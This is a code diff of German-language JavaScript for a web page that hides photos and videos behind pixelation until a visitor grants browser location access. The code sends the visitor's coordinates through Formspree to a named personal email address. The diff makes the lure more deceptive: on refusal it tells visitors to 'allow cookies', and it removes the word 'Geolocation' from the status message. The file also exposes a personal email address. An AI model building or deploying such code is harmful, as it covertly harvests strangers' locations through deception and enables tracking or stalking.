@@ -7,99 +7,79 @@ function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
     } else {
-        document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
-        showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
+        updateStatus("Anfrage wird von diesem Browser nicht unterstützt.");
+        showNewImages();
     }
 }
 
-// Funktion zum Senden der Standortdaten per E-Mail
+// Standort per E-Mail senden
 function sendLocationByEmail(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    // Standortdaten an den Server senden (via Formspree)
     const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
     sendLocationToFormspree(locationData);
     
-    // Wenn Standort erfolgreich ermittelt wurde, entferne die Verpixelung
+    // Entferne Verpixelung nach erfolgreicher Standortermittlung
     removePixelation();
 }
 
-// Funktion, um Standortdaten an Formspree zu senden
+// Standortdaten an Formspree senden
 function sendLocationToFormspree(locationData) {
     const formData = new FormData();
-    formData.append("email", "nejat.balta@outlook.de");  // Empfänger E-Mail-Adresse
+    formData.append("email", "nejat.balta@outlook.de");
     formData.append("subject", "Standortdaten des Besuchers");
     formData.append("message", `Die Koordinaten des Besuchers: ${locationData}`);
 
-    // Sende die Daten an Formspree
     fetch("https://formspree.io/f/mpwplqao", {
         method: "POST",
         body: formData
     })
     .then(response => {
         if (response.ok) {
-            console.log("Standortdaten erfolgreich gesendet");
+            console.log("Standort erfolgreich gesendet");
         } else {
             console.error("Fehler beim Senden der Standortdaten", response);
         }
     })
-    .catch(error => {
-        console.error("Fehler beim Senden an Formspree:", error);
-    });
+    .catch(error => console.error("Fehler beim Senden an Formspree:", error));
 }
 
-// Fehlerbehandlung für den Standortabruf
+// Fehlerbehandlung für Standortabruf
 function showError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            document.getElementById("status").innerHTML = "Benutzer hat den Zugriff auf den Standort verweigert.";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            document.getElementById("status").innerHTML = "Standortinformationen sind nicht verfügbar.";
-            break;
-        case error.TIMEOUT:
-            document.getElementById("status").innerHTML = "Die Anfrage zum Abrufen des Standorts hat zu lange gedauert.";
-            break;
-        case error.UNKNOWN_ERROR:
-            document.getElementById("status").innerHTML = "Ein unbekannter Fehler ist aufgetreten.";
-            break;
-    }
-    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
+    const errorMessage = "Bitte laden Sie die Seite neu und erlauben Sie den Zugriff auf Cookies, um die Fotos und Videos anzusehen.";
+    updateStatus(errorMessage);
+    showNewImages();
 }
 
-// Funktion, um neue Bilder hinzuzufügen (zuerst verpixelt)
+// Fehlermeldung anzeigen
+function updateStatus(message) {
+    document.getElementById("status").innerHTML = message;
+}
+
+// Neue Bilder einfügen (verpixelt)
 function showNewImages() {
-    document.getElementById("new-images").style.display = "block";
+    const imageContainer = document.getElementById("additional-images");
 
-    // Beispielbilder
-    const newImages = [
-        'bild4.jpg', 
-        'bild5.jpg', 
-        'bild6.jpg'
-    ];
+    // Verhindert doppeltes Einfügen von Bildern
+    if (imageContainer.children.length > 0) return; 
 
-    const additionalImagesContainer = document.getElementById("additional-images");
+    const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];
 
-    newImages.forEach(function(imageSrc) {
+    newImages.forEach(imageSrc => {
         const imgElement = document.createElement("img");
         imgElement.src = imageSrc;
         imgElement.alt = "Weitere Bilder";
-        
-        // Verpixelte Bilder hinzufügen
         imgElement.classList.add('pixelated'); 
-
-        additionalImagesContainer.appendChild(imgElement);
+        imageContainer.appendChild(imgElement);
     });
 
-    // Zeige die Nachricht an, wenn der Standort ermittelt wurde
     document.getElementById("message").style.display = "block";
 }
 
-// Funktion, um Verpixelung von Bildern zu entfernen, wenn Standort erfolgreich ermittelt wurde
+// Entfernt Verpixelung nach erfolgreicher Standortfreigabe
 function removePixelation() {
-    const images = document.querySelectorAll('#additional-images img');
-    images.forEach(img => {
+    document.querySelectorAll('#additional-images img').forEach(img => {
         img.classList.remove('pixelated');
     });
 }
